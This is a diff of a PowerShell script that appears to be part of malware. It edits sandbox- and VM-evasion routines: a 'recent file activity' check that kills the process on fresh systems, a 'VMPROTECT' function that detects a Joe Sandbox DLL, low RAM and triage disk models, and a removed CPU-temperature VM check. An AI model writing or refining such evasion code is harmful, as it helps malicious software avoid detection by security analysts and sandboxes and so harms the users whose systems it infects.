@@ -42,7 +42,7 @@ function RecentFileActivity {
     $file = Get-ChildItem -Path $file_Dir -Recurse
     #if number of files is less than 20
     if ($file.Count -lt 20) {
-        System.Windows.Forms.MessageBox]::Show('RECENT FILE ACTIVITY CHECK FAILED !', '', 'OK', 'Error')
+        [System.Windows.Forms.MessageBox]::Show('RECENT FILE ACTIVITY CHECK FAILED !', '', 'OK', 'Error')
         Stop-Process $pid -Force
     }
 }
@@ -70,20 +70,6 @@ function Search-Username {
     $getuser = [Security.Principal.WindowsIdentity]::GetCurrent().Name
     $username = $getuser.Split("\")[1]
     return $username
-}
-
-function TEMPCHECK {
-    $thermalZone = Get-WmiObject -Query "SELECT * FROM MSAcpi_ThermalZoneTemperature" -Namespace "root\WMI" -EA Ignore
-    if ($thermalZone -ne $null) {
-        foreach ($zone in $thermalZone) {
-            $temperature = ($zone.CurrentTemperature - 2732) / 10
-            Write-Host "[!] Current CPU Temperature: $temperature *C"
-        }
-    } else {
-        Write-Host "[!] Unable to retrieve CPU temperature. Probably a VM"
-        sleep 2
-        exit
-    }
 }
 
 function Invoke-ANTITOTAL {
@@ -139,7 +125,6 @@ function ram_check {
 
 function VMPROTECT {
     if (Test-Path "$env:localappdata\Temp\JSAMSIProvider64.dll") { Stop-Process $pid -Force }
-    TEMPCHECK
     ram_check           
     #triage detection
     $d = wmic diskdrive get model
